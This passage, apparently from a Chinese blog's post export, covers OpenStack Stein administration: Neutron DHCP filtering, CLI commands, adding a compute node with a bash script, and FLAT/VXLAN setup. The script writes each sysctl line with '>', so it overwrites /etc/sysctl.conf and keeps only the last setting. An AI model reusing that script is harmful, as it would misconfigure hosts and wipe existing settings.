255.255.255.255/32 -p udp -m udp --sport 68 --dport 67 -m comment --comment &quot;Allow DHCP client traffic.&quot; -j RETURN-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 68 --dport 67 -m comment --comment &quot;Allow DHCP client traffic.&quot;-j RETURN-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 67 --dport 68 -m comment --comment &quot;Prevent DHCP Spoofing by VM.&quot; -j DROP\n比较重要的是这两条规则，第一条规则如下\n-A neutron-linuxbri-i76c0c08c-7 -d 10.0.0.206/32 -p udp -m udp --sport 67 --dport 68 -j RETURN\n第一条规则是当DHCP分配的地址是10.0.0.206的话则把这条丢到原链上的，即原本的INPUT、OUTPUT中只要是放行的则这条就是通过，去看了看原链上的规则就是ACCEPT,规则如下\n[root@compute1 ~]# iptables -LChain INPUT (policy ACCEPT)target     prot opt source               destinationneutron-linuxbri-INPUT  all  --  anywhere             anywhereChain FORWARD (policy ACCEPT)target     prot opt source               destinationneutron-filter-top  all  --  anywhere             anywhereneutron-linuxbri-FORWARD  all  --  anywhere             anywhereChain OUTPUT (policy ACCEPT)target     prot opt source               destinationneutron-filter-top  all  --  anywhere             anywhereneutron-linuxbri-OUTPUT  all  --  anywhere             anywhere......\n那就是说他这个实例允许收到这个ip的DHCP回包。再去看第二条，规则如下\n-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 67 --dport 68 -m comment --comment &quot;Prevent DHCP Spoofing by VM.&quot; -j DROP\niptables的规则是从上到下去匹配的，如果不符合上面206的规则那么这条将会丢弃所有DHCP的Offer包，就导致不管子网内的主机有没有配置DHCP，都没办法使用外部的DHCP。好，现在第一个疑问解决了，再看第二个为什么内部DHCP开启没办法给外部主机分配DHCP，我直接把VMware的DHCP关掉，关掉之后开一台这个网络的虚机，让他去通过DHCP获取IP，然后我在控制节点对应QDHCP的命名空间中去抓QDHCP的网卡，当外部主机区获取IP的时候抓到了下面的数据，如图发现他一直在发包DHCP的Discover包，一直在广播域中去找DHCP拿ip，但是QDHCP并没有回应他，到这里我就已经明白了，Neutron他自己维护的DHCP只会对集群自己的管理的实例进行服务，实现的方式估计也是通过MAC地址实现过滤，当符合他ip的MAC则就分配这个ip，如果不符合那么就不作为，具体可以参考他QDHCP实现软件的相关配置，我默认配置的DHCP-Agent实现方式如下\n[root@controller ~]# cat /etc/neutron/dhcp_agent.ini[DEFAULT]interface_driver = linuxbridgedhcp_driver = neutron.agent.linux.dhcp.Dnsmasqenable_isolated_metadata = true\n他的实现是采用Dnsmasq软件，我们去看一下他的启动参数，通过下面的命令拿到\n[root@controller ~]# ip netns exec qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ps aux |grep dnsmasqnobody     7584  0.0  0.0  56128  1068 ?        S    17:22   0:00 dnsmasq --no-hosts --no-resolv --pid-file=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/pid --dhcp-hostsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/host --addn-hosts=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/addn_hosts --dhcp-optsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/opts --dhcp-leasefile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/leases --dhcp-match=set:ipxe,175 --dhcp-userclass=set:ipxe6,iPXE --local-service --bind-dynamic --dhcp-range=set:subnet-69611b38-36b5-4e98-b47e-949c2137dbe1,10.0.0.0,static,255.255.255.0,86400s --dhcp-option-force=option:mtu,1500 --dhcp-lease-max=256 --conf-file= --domain=openstacklocal\n具体的这些参数可以自己GPT，我这里说一下软件是怎么实现的这个功能，他的行参中有一项--dhcp-hostsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/host，这个参数的作用是加载一个 预定义的 MAC-IP 映射文件，仅响应文件中列出的 MAC 地址的 DHCP 请求。这个文件是由neutron去管理，内容可以查看一下\n[root@controller ~]# cat /var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/hostfa:16:3e:4d:6a:b1,host-10-0-0-206.openstacklocal,10.0.0.206fa:16:3e:cb:5e:78,host-10-0-0-200.openstacklocal,10.0.0.200\n这里就存着他自己和我的实例的对应表。到这里这个问题就清晰了，互不干预的原因是因为它内部有过滤规则和相应条件，内部只会把内部的DHCP包交给实例，否则会过滤掉，并且内部的DHCP不会去响应外部机器的Discover包。\n两层网桥网桥和OpenStack中的概念对应关系具体参考下图，具体的实验可以通过在同网络下一个子网一个实例，一个一个去增加实例和子网网络等操作，去节点中查看他们的网络ip网卡网桥对应表。\n除了VXLAN的实现还有其他的吗？有的兄弟，有的，VLAN、VXLAN、GRE、Flat、Geneve、Local，如图它们的区别这里大体讲一下\n\nVLAN 我记得VLAN是有数量限制的，应该是4096个，如果采用VLAN的形式还需要在对应的网络设备接口中打Trunk需要配合。\nVXLAN 它支持16M的网络数量，可以说是基本用不完，还可以跨数据中心，他就有一点缺点，他需要多一层数据封包，多了额外的计算资源的开销。\nGRE 这是个隧道协议，它可以跨多个物理网络，并且支持协议也多灵活度也高，但是他不提供数据加密，通常需要配合IPsec，还有就是带宽和性能受到隧道负载的影响。\nFlat 不多说了 就是直连网络，而且没有网络隔离。\nGeneve 这个比VXLAN更加优秀，但是他比较新，还没有普及。\nLocal 虚机想要通信必须在同一个主机并且同一个Local网络中，条件苛刻，但是比较安全。\n\n要注意的是，在配置这些网络的时候请在配置中设置支持，配置参考/etc/neutron/plugins/ml2/ml2_conf.ini\ntype_drivers = flat,vlan,vxlan\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Provider","VXLAN"]},{"title":"OpenStack-命令控制","url":"/2025/02/07/OpenStack-%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/","content":"身份验证export OS_USERNAME=adminexport OS_PASSWORD=ADMIN_PASSexport OS_PROJECT_NAME=adminexport OS_USER_DOMAIN_NAME=Defaultexport OS_PROJECT_DOMAIN_NAME=Defaultexport OS_AUTH_URL=http://controller:5000/v3export OS_IDENTITY_API_VERSION=3\n项目管理帮助信息[root@controller ~]# openstack project -hCommand &quot;project&quot; matches:  project create  project delete  project list  project purge  project set  project show\n项目创建执行openstack project create cec命令创建一个名为cec的项目\n[root@controller ~]# openstack project create cec+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description |                                  || domain_id   | default                          || enabled     | True                             || id          | d4bc3306513e4ad29a909a48a2d99050 || is_domain   | False                            || name        | cec                              || parent_id   | default                          || tags        | []                               |+-------------+----------------------------------+\n用户管理帮助信息[root@controller ~]# openstack user -hCommand &quot;user&quot; matches:  user create  user delete  user list  user password set  user set  user show\n用户创建执行openstack user create --domain default --password openstack2025 zhangsan命令创建一个名字为zhangsan密码为openstack2025的用户。\n[root@controller ~]# openstack user create --domain default --password openstack2025 zhangsan+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | default                          || enabled             | True                             || id                  | fdb63599689244748bc10f696cef95ef || name                | zhangsan                         || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+\n\n角色管理帮助信息[root@controller ~]# openstack role -hCommand &quot;role&quot; matches:  role add  role assignment list  role create  role delete  role list  role remove  role set  role show\n列出所有角色执行openstack role list命令查看所有角色\n[root@controller ~]# openstack role list+----------------------------------+--------+| ID                               | Name   |+----------------------------------+--------+| 5daaa049f2074497b015fc8e47bbe847 | reader || 654636054f124ade812e3aac84059880 | user   || 9feed25c0a2a4fcaae9eefd1d1ec872e | member || e55c05c671b445c6bab35dfaf337433d | admin  |+----------------------------------+--------+\n用户授权执行openstack role add --project cec --user zhangsan admin命令，把用户zhangsan划分到cec项目中并且给予admin权限。这条命令正常是无回显的。\n[root@controller ~]# openstack role add --project cec --user zhangsan admin\n网络管理帮助信息[root@controller ~]# openstack network -hCommand &quot;network&quot; matches:  network agent add network  network agent add router  network agent delete  network agent list  network agent remove network  network agent remove router  network agent set  network agent show  network auto allocated topology create  network auto allocated topology delete  network create  network delete......\n这个有很多,不说细写,用到的时候再去学习也不是很晚。\n列出网络通过命令openstack network list列出网络\n[root@controller ~]# openstack network list+--------------------------------------+------------+--------------------------------------+| ID                                   | Name       | Subnets                              |+--------------------------------------+------------+--------------------------------------+| 0a89e120-408a-4495-a6b5-6bae36b45087 | test1      | 42a42a5c-7c7f-42b6-8335-0bd4ff9c5b7a || 5b0ca4e2-9cb7-40ff-8126-8f6871366ea8 | net_vmnet1 | acefb75a-c3e4-41f8-b411-756ca7145099 || dd604587-3542-409b-9ca8-eed06840fb55 | provider   | 69611b38-36b5-4e98-b47e-949c2137dbe1 |+--------------------------------------+------------+--------------------------------------+\n详细信息通过命令openstack network show &#123;网络名称&#125;即可列出他的详细信息\n创建网络通过命令openstack network create --share --external --provider-network-type flat public --provider-physical-network provider 来创建flat一个网络，参数具体含义如下\n\n–share 共享的\n–external 外部的\n–provider-network-type flat 指定网络类型为flat\npublic 网络名称\n–provider-physical-network provider 指定物理网络名称为provider\n\n其中provider是在neutron的ml2模块中指定的。其他参数可以参考 openstack network create -h命令给的帮助\n[root@controller ~]# openstack network create -husage: openstack network create [-h] [-f &#123;json,shell,table,value,yaml&#125;]                                [-c COLUMN] [--max-width &lt;integer&gt;]                                [--fit-width] [--print-empty] [--noindent]                                [--prefix PREFIX] [--share | --no-share]                                [--enable | --disable] [--project &lt;project&gt;]                                [--description &lt;description&gt;] [--mtu &lt;mtu&gt;]                                [--project-domain &lt;project-domain&gt;]                                [--availability-zone-hint &lt;availability-zone&gt;]                                [--enable-port-security | --disable-port-security]                                [--external | --internal]                                [--default | --no-default]                                [--qos-policy &lt;qos-policy&gt;]                                [--transparent-vlan | --no-transparent-vlan]                                [--provider-network-type &lt;provider-network-type&gt;]                                [--provider-physical-network &lt;provider-physical-network&gt;]                                [--provider-segment &lt;provider-segment&gt;]                                [--dns-domain &lt;dns-domain&gt;]                                [--tag &lt;tag&gt; | --no-tag]                                &lt;name&gt;\n创建vpc网络openstack network create --project cec --provider-network-type vxlan cec-vpc\n创建子网参考命令如下\n# 命令如下 openstack subnet create cec-subnet --network cec-vpc --subnet-range 172.16.2.0/24 --allocation-pool start=172.16.2.1,end=172.16.2.253 --gateway 172.16.2.254 --dns-nameserver 223.5.5.5# 注解如下openstack subnet create --network 指定网络名称 --allocation-pool start=分配起始ip,end=结束分配ip --dns-nameserver 分配的dns主机 --gateway 网关 --subnet-range 网络地址 名字\n创建路由执行openstack router create --project cec cec-router命令在cec项目中创建一个路由\n关联路由出口网络执行openstack router set cec-router --external-gateway provider命令设置cec-router路由的外部出口接口为provider网络,执行下面命令成功是无回显的。这条命令是不支持--project指定项目的，如果多个项目中都有这个名字，可以使用openstack project set &lt;project_name&gt;来切换项目，或者更新openrc验证脚本的OS_PROJECT_NAME参数\n关联路由内部网络执行openstack router add subnet cec-router cec-subnet关联路由的内部网络，这条命令是不支持--project指定项目的，如果多个项目中都有这个名字，可以更新openrc验证脚本的OS_PROJECT_NAME参数。\n安全组管理安全组列出通过openstack security group list命令列出所有安全组\n安全组创建通过openstack security group create --project cec cec-sg命令在cec项目中创建一个名为cec-sg的安全组\n安全组规则创建通过openstack security group rule create --project cec --proto tcp --dst-port 22:22 cec-sg命令来放行cec项目中的cec-sg安全组的22端口\n虚机管理规格列出执行openstack flavor list命令列出实例规格\n[root@controller ~]# openstack flavor list+----+---------+-----+------+-----------+-------+-----------+| ID | Name    | RAM | Disk | Ephemeral | VCPUs | Is Public |+----+---------+-----+------+-----------+-------+-----------+| 0  | m1.nano |  64 |    1 |         0 |     1 | True      |+----+---------+-----+------+-----------+-------+-----------+\n规格创建通过命令openstack flavor create n1.nano --vcpus 1 --ram 128 --disk 1创建一个名字为n1.nano cpu数量为1 内存为128m 磁盘为1G的实例规格\n[root@controller ~]# openstack flavor create n1.nano --vcpus 1 --ram 128 --disk 1+----------------------------+--------------------------------------+| Field                      | Value                                |+----------------------------+--------------------------------------+| OS-FLV-DISABLED:disabled   | False                                || OS-FLV-EXT-DATA:ephemeral  | 0                                    || disk                       | 1                                    || id                         | bf316702-0183-46ea-8a6c-5a8678f17d7d || name                       | n1.nano                              || os-flavor-access:is_public | True                                 || properties                 |                                      || ram                        | 128                                  || rxtx_factor                | 1.0                                  || swap                       |                                      || vcpus                      | 1                                    |+----------------------------+--------------------------------------+\n创建虚机使用openstack server create --flavor n1.nano --image cirros --nic net-id=cec-vpc --security-group cec-sg cec-vm01命令创建一个规格为n1.nano 镜像为cirros 网络为cec-vpc 安全组为cec-sg 名为cec-vm01的虚机\n列出虚机通过openstack server list命令列出当前项目下的虚机\n[root@controller ~]# openstack server list+--------------------------------------+----------+--------+---------------------+--------+---------+| ID                                   | Name     | Status | Networks            | Image  | Flavor  |+--------------------------------------+----------+--------+---------------------+--------+---------+| 965bc540-28b9-45a9-9130-b1f6a94d11cd | cec-vm01 | ACTIVE | cec-vpc=172.16.2.44 | cirros | n1.nano |+--------------------------------------+----------+--------+---------------------+--------+---------+\n创建浮动IP通过openstack floating ip create provider命令创建一个浮动ip，\n关联浮动ip给虚机通过openstack server add floating ip cec-vm01 10.0.0.204命令给主机cec-vm01关联10.0.0.204的浮动ip，如果不指定ip直接执行则会从浮动ip中随机拿一条给他用。这条命令执行成功是无回显的。\n其他命令OpenStack的命令有很多很多，这里无法一一的去做讲解，而是在实战中使用学习，这里只是说了些常用的，还有一些删除增加查看这里可能没说，基本上就是openstack 类别 list|create|delete|show来去管理这些内容。\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Stein"]},{"title":"OpenStack-增加计算节点(附shell脚本)","url":"/2025/01/05/OpenStack-%E5%A2%9E%E5%8A%A0%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9(%E9%99%84shell%E8%84%9A%E6%9C%AC)/","content":"前言官方默认搭建的文档是1控制1计算，实际1个计算节点肯定是不行的，这篇文章将基于openstack集群进行增加计算节点，如果是已经正确的搭建过一次1控制1计算的openstack则本文实操起来应该并不难，因为需要安装的组件就两个，下面开始。(S版本)\n环境配置环境是一台CentOS7.9的机器，然后selinux和firewalld都是关闭的，因为条件有限配置是1H1G的配置。\n网络环境主机名为compute2。修改网络内全部的hosts文件，如果有dns则更好\n[root@compute2 ~]# cat /etc/hosts                                                 127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4    ::1         localhost localhost.localdomain localhost6 localhost6.localdomain6                 # controller10.0.0.11       controller# compute1              10.0.0.31       compute110.0.0.32       compute2\n时间同步执行下面命令设置时区以及安装chrony\n[root@compute2 ~]# timedatectl set-timezone Asia/Shanghai[root@compute2 ~]# yum -y install chrony\n参考下面配置\n[root@compute2 ~]# cat /etc/chrony.conf |egrep -v &quot;^#|^$&quot;server controller iburst                                                           driftfile /var/lib/chrony/driftmakestep 1.0 3rtcsynclogdir /var/log/chrony[root@compute2 ~]# \n重启服务\n[root@compute2 ~]# systemctl restart chronyd\n执行命令chronyc sources查看\n基础软件包我这里是安装s版本的openstack，参考文档地址： https://docs.openstack.org/install-guide/environment-packages-rdo.html所有主机都执行下面命令,用来安装openstack对应的yum仓库。\nyum install -y centos-release-openstack-stein\n在24年12月28日，他自己的这些源有一部分是不可以用的,通过下面命令进行替换阿里的镜像站\ncd /etc/yum.repos.dsed -i &#x27;s/mirrorlist=/#mirrorlist=/g&#x27; *.reposed -i &#x27;s/#baseurl=/baseurl=/g&#x27; *.reposed -i &#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27; *.repo\n安装openstack的客户端管理工具\nyum install python-openstackclient -y \n\n组件安装Nova - 计算组件下面的操作是在计算节点中操作，文档参考： https://docs.openstack.org/nova/stein/install/compute-install-rdo.html下面开始安装组件\nyum install -y openstack-nova-compute\n下面开始修改配置\n# 备份cp /etc/nova/nova.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf\n编辑配置/etc/nova/nova.conf，主要修改下面内容\n[DEFAULT]use_neutron = truefirewall_driver = nova.virt.firewall.NoopFirewallDrivermy_ip = 10.0.0.32enabled_apis = osapi_compute,metadatatransport_url = rabbit://openstack:RABBIT_PASS@controller[api]auth_strategy = keystone[glance]api_servers = http://controller:9292[keystone_authtoken]auth_url = http://controller:5000/v3memcached_servers = controller:11211auth_type = passwordproject_domain_name = Defaultuser_domain_name = Defaultproject_name = serviceusername = novapassword = NOVA_PASS[oslo_concurrency]lock_path = /var/lib/nova/tmp[placement]                                                                        region_name = RegionOneproject_domain_name = Defaultproject_name = serviceauth_type = passworduser_domain_name = Defaultauth_url = http://controller:5000/v3username = placementpassword = PLACEMENT_PASS[vnc]                                                                              enabled = trueserver_listen = 0.0.0.0server_proxyclient_address = $my_ipnovncproxy_base_url = http://controller:6080/vnc_auto.html\n要注意的是my_ip这里需要改成自己的ip。启动服务\nsystemctl enable --now libvirtd.service openstack-nova-compute.service\n然后验证参考链接： https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database每次加计算节点的时候都需要在控制节点执行\nsu -s /bin/sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova\n这是用来发现主机的，如果不想手动去执行，则可以在nova的控制节点配置中添加这段配置\n[scheduler]discover_hosts_in_cells_interval = 300\n\nNeutron - 网络组件参考文档： https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html安装组件\nyum install -y openstack-neutron-linuxbridge ebtables ipset\n备份配置\n# 备份cp /etc/neutron/neutron.conf&#123;,.bak&#125;cp /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.confegrep -v &quot;^$|^#&quot; /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini\n编辑配置/etc/neutron/neutron.conf主要修改内容如下\n[DEFAULT]                                                                          transport_url = rabbit://openstack:RABBIT_PASS@controller                          auth_strategy = keystone[keystone_authtoken]                                                               www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = neutronpassword = NEUTRON_PASS[oslo_concurrency]              lock_path = /var/lib/neutron/tmp\n下面配置ml2模块，编辑/etc/neutron/plugins/ml2/linuxbridge_agent.ini，主要内容和控制节点的一样，直接复制也行，主要内容如下\n[linux_bridge]                                                                physical_interface_mappings = provider:ens33                [vxlan]                                                                       enable_vxlan = false                                                          [securitygroup]                                                               enable_security_group = true                                                  firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver\n下面开始加载系统模块，\necho &quot;br_netfilter&quot; &gt;&gt; /etc/modules-load.d/bridge.confmodprobe br_netfilter\n配置sysctl,编辑/etc/sysctl.conf\nnet.bridge.bridge-nf-call-iptables = 1 net.bridge.bridge-nf-call-ip6tables = 1\n执行sysctl -p重载下面在计算节点的计算模块对接一下,编辑/etc/nova/nova.conf,主要修改内容如下\n[neutron]url = http://controller:9696auth_url = http://controller:5000auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultregion_name = RegionOneproject_name = serviceusername = neutronpassword = NEUTRON_PASS\n重启计算节点的nova服务\nsystemctl restart openstack-nova-compute.service\n启动计算节点的neutron模块\nsystemctl enable --now neutron-linuxbridge-agent.service\n其他配置因为系统是centos7.9默认虚机模拟硬件是rhel7.6，这个是用不了的，实例开机会出现Booting from Hard Disk...的问题，要解决这个问题可以参考这篇文章的问题解决，这里直接做修改修改nova计算节点的配置文件/etc/nova/nova.conf，修改内容如下\n# libvirt 段增加[libvirt]hw_machine_type=x86_64=pc-i440fx-rhel7.2.0\n修改之后重启服务\nsystemctl restart libvirtd openstack-nova-compute\n成果验证此时去仪表盘中查看计算节点的主机列表确保实例是运行在第二台机器上的\n编写自动脚本增加计算节点的操作并不多，这里可以直接编写自动脚本实现加节点的操作，脚本如下要注意的是，这个脚本是基于我当前环境做的，自己用请根据实际情况来编写，我这个只能作为一个参考，编写脚本的时候一开始我认为应该多写一些判断和信息输出，写了一会发现对于我当前的环境写这么多判断和输出意义不大，所以后面就没怎么加了，所以我这个只能作为参考不建议直接拿来用，请根据自己的情况来编写\n#!/bin/bash# 判断比较简单，只提供参考，不建议直接用，请根据实际情况修改hostname=&quot;compute3&quot;eth_name=&quot;ens33&quot;ip=`ip -4 addr show $eth_name | grep inet | awk &#x27;&#123; print $2 &#125;&#x27; | cut -d&#x27;/&#x27; -f1`set_chrony() &#123;    if ! rpm -q chrony &gt; /dev/null 2&gt;&amp;1; then        echo &quot;[INSTALL]安装chrony中...&quot;        yum -y install chrony &gt; /dev/null 2&gt;&amp;1        if ! rpm -q chrony &gt; /dev/null 2&gt;&amp;1; then            echo &quot;[ERROR]: Chrony安装失败&quot;            exit 1        else            echo &quot;[INSTALL] Chrony 安装成功&quot;        fi    else        echo &quot;[INSTALL] Chrony 已经安装&quot;    fi        cp /etc/chrony.conf&#123;,.bak&#125;    cat &lt;&lt; EOF &gt; /etc/chrony.confserver controller iburst                                                           driftfile /var/lib/chrony/driftmakestep 1.0 3rtcsynclogdir /var/log/chronyEOF    systemctl enable chronyd    systemctl restart chronyd&#125;install_base_package()&#123;    yum install -y centos-release-openstack-stein &gt; /dev/null 2&gt;&amp;1    cd /etc/yum.repos.d    sed -i &#x27;s/mirrorlist=/#mirrorlist=/g&#x27; *.repo    sed -i &#x27;s/#baseurl=/baseurl=/g&#x27; *.repo    sed -i &#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27; *.repo    yum install python-openstackclient -y  &gt; /dev/null 2&gt;&amp;1&#125;install_nova() &#123;yum install -y openstack-nova-compute &gt; /dev/null 2&gt;&amp;1cp /etc/nova/nova.conf&#123;,.bak&#125;egrep -v &quot;^$|^#&quot; /etc/nova/nova.conf.bak &gt; /etc/nova/nova.confcat &lt;&lt; EOF &gt; /etc/nova/nova.conf[DEFAULT]use_neutron = truefirewall_driver = nova.virt.firewall.NoopFirewallDrivermy_ip = $ipenabled_apis = osapi_compute,metadatatransport_url = rabbit://openstack:RABBIT_PASS@controller[api]auth_strategy = keystone[api_database][barbican][cache][cells][cinder][compute][conductor][console][consoleauth][cors][database][devices][ephemeral_storage_encryption][filter_scheduler][glance]api_servers = http://controller:9292[guestfs][healthcheck][hyperv][ironic][key_manager][keystone][keystone_authtoken]auth_url = http://controller:5000/v3memcached_servers = controller:11211auth_type = passwordproject_domain_name = Defaultuser_domain_name = Defaultproject_name = serviceusername = novapassword = NOVA_PASS[libvirt]hw_machine_type=x86_64=pc-i440fx-rhel7.2.0[metrics][mks][neutron]url = http://controller:9696auth_url = http://controller:5000auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultregion_name = RegionOneproject_name = serviceusername = neutronpassword = NEUTRON_PASS[notifications][osapi_v21][oslo_concurrency]lock_path = /var/lib/nova/tmp[oslo_messaging_amqp][oslo_messaging_kafka][oslo_messaging_notifications][oslo_messaging_rabbit][oslo_middleware][oslo_policy][pci][placement]region_name = RegionOneproject_domain_name = Defaultproject_name = serviceauth_type = passworduser_domain_name = Defaultauth_url = http://controller:5000/v3username = placementpassword = PLACEMENT_PASS[placement_database][powervm][privsep][profiler][quota][rdp][remote_debug][scheduler][serial_console][service_user][spice][upgrade_levels][vault][vendordata_dynamic_auth][vmware][vnc]enabled = trueserver_listen = 0.0.0.0server_proxyclient_address = \\$my_ipnovncproxy_base_url = http://controller:6080/vnc_auto.html[workarounds][wsgi][xenserver][xvp][zvm]EOFsystemctl enable --now libvirtd.service openstack-nova-compute.service&#125;install_neutron() &#123;    yum install -y openstack-neutron-linuxbridge ebtables ipset &gt; /dev/null 2&gt;&amp;1    cp /etc/neutron/neutron.conf&#123;,.bak&#125;    cp /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;    egrep -v &quot;^$|^#&quot; /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.conf    egrep -v &quot;^$|^#&quot; /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini    cat &lt;&lt; EOF &gt; /etc/neutron/neutron.conf[DEFAULT]transport_url = rabbit://openstack:RABBIT_PASS@controller                          auth_strategy = keystone[cors][database][keystone_authtoken]www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = neutronpassword = NEUTRON_PASS[oslo_concurrency]lock_path = /var/lib/neutron/tmp[oslo_messaging_amqp][oslo_messaging_kafka][oslo_messaging_notifications][oslo_messaging_rabbit][oslo_middleware][oslo_policy][privsep][ssl]EOF    cat &lt;&lt; EOF &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini[DEFAULT][linux_bridge]                                                                physical_interface_mappings = provider:ens33                [vxlan]                                                                       enable_vxlan = false                                                          [securitygroup]                                                               enable_security_group = true                                                  firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriverEOF    echo &quot;br_netfilter&quot; &gt;&gt; /etc/modules-load.d/bridge.conf    modprobe br_netfilter    echo &quot;net.bridge.bridge-nf-call-iptables = 1 &quot; &gt; /etc/sysctl.conf    echo &quot;net.bridge.bridge-nf-call-ip6tables = 1&quot; &gt; /etc/sysctl.conf    sysctl -p    systemctl enable --now neutron-linuxbridge-agent.service&#125;# 检查if [ -z &quot;$eth_name&quot; ] || [ -z &quot;$ip&quot; ]; then    echo &quot;ip获取失败，请检查网卡名字和ip&quot;    exit 1fiset_chronyinstall_base_packageinstall_novainstall_neutronecho &quot;安装成功&quot;\n验证结果\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Stein"]},{"title":"OpenStack-网络-FLAT与VXLAN","url":"/2025/01/22/OpenStack-%E7%BD%91%E7%BB%9C-FLAT%E4%B8%8EVXLAN/","content":"FLAT网络Flat网络，相当于直连到对应网络中，没有套任何一层，所有设备都在同一个广播域中。最开始搭建的供应商网络就是这种形式，直连到对应的一个网络中。这里将讲解如何增加一个Flat网络。首先先在所有的网络计算节点添加一个网卡(注意搭建的时候控制节点也加上了网络控制节点，虽然不知道用处在哪，但是为了不出问题建议也加上。)这里添加了一个仅主机模式的网卡，一定是在所有计算节点都添加上。添加上之后开始设置网卡，增加后的网卡名字是ens36，执行下面命令进行配置\n[root@compute1 ~]# cd /etc/sysconfig/network-scripts/[root@compute1 network-scripts]# cp ifcfg-ens33 ifcfg-ens36# 修改ens36的网卡，最终保留下面信息即可。TYPE=EthernetBOOTPROTO=staticNAME=ens36DEVICE=ens36ONBOOT=yesNETMASK=255.255.255.0IPADDR=192.168.244.128\nIP的配置只需要保留ip和掩码即可，因为仅主机模式，本身就不可以连接外部网路所以也没必要加网关和DNS。其余主机也都是这样配置，ip设置成dhcp获取的动态ip即可，或者自己手写一个网段都行(请根据自己的网络环境设置)。下面开始配置控制节点的neutron,编辑文件/etc/neutron/plugins/ml2/ml2_conf.ini,修改配置如下\n# 修改flat_networks = provider# 为flat_networks = provider,net_vmnet1\n此时去所有的网络计算节点/etc/neutron/plugins/ml2/linuxbridge_agent.ini,修改配置如下\n# linux_bridge 段下physical_interface_mappings = provider:ens33# 修改为physical_interface_mappings = provider:ens33,net_vmnet1:ens36\n修改好之后在网络控制节点执行下面命令\nsystemctl restart neutron-server neutron-dhcp-agent neutron-metadata-agent neutron-linuxbridge-agent\n在网络的计算节点执行下面命令\nsystemctl restart neutron-linuxbridge-agent\n此时flat网络已经配置好了，下面开始创建网络，创建网络的形式可以和最开始搭建集群的时候采用的命令形式，这里采用仪表的形式去创建网络，在仪表的管理员-》网络-》网络中创建网络此时再去创建实例测试一下是否连通发现是可以的，这就说明已经通了。\nVXLAN网络与VPCVXLAN是VLAN的扩展，VLAN与VXLAN的区别这里不多描述，FLAT是没有套任何一层网络与外部网络直连，VXLAN是三层网络，在openstack中相当于多套了一层可以实现网络的隔离更加安全。在配置之前需要继续添加一个网卡，这里采用lan区段的方式增加，所有网络计算节点都要添加，如下此时机器中多了一个ens37的网卡，下面开始配置ens37的网络配置，如下\n[root@controller ~]# cd /etc/sysconfig/network-scripts/[root@controller network-scripts]# cp ifcfg-ens36 ifcfg-ens37# 修改成下面内容TYPE=EthernetBOOTPROTO=staticNAME=ens37DEVICE=ens37ONBOOT=yesNETMASK=255.255.255.0IPADDR=172.16.0.11\n网卡都添加好后开始配置vxlan，具体可以参考文档\n\nhttps://docs.openstack.org/neutron/stein/install/\nhttps://docs.openstack.org/neutron/stein/install/install-rdo.html\nhttps://docs.openstack.org/neutron/stein/install/controller-install-rdo.html\nhttps://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.html\nhttps://docs.openstack.org/neutron/stein/install/compute-install-rdo.html使用vxlan之前需要把供应商网络提前装好这个要注意，下面开始安装软件包，不出意外这些应该是安装好的。下面是在neutron控制网络节点配置的\n\nyum install openstack-neutron openstack-neutron-ml2 \\  openstack-neutron-linuxbridge ebtables\n修改neutron配置，编辑/etc/neutron/neutron.conf文件，主要修改内容如下\n# DEFAULT 段# 修改service_plugins = # 为service_plugins = router# 增加allow_overlapping_ips = true# 完整的 DEFAULT 段 应该是这个样子[DEFAULT]notify_nova_on_port_status_changes = truenotify_nova_on_port_data_changes = truetransport_url = rabbit://openstack:RABBIT_PASS@controllercore_plugin = ml2auth_strategy = keystoneservice_plugins = routerallow_overlapping_ips = true\n修改ml2的配置，修改/etc/neutron/plugins/ml2/ml2_conf.ini文件，主要修改内容如下\n# ml2 段# 修改type_drivers = flat,vlantenant_network_types 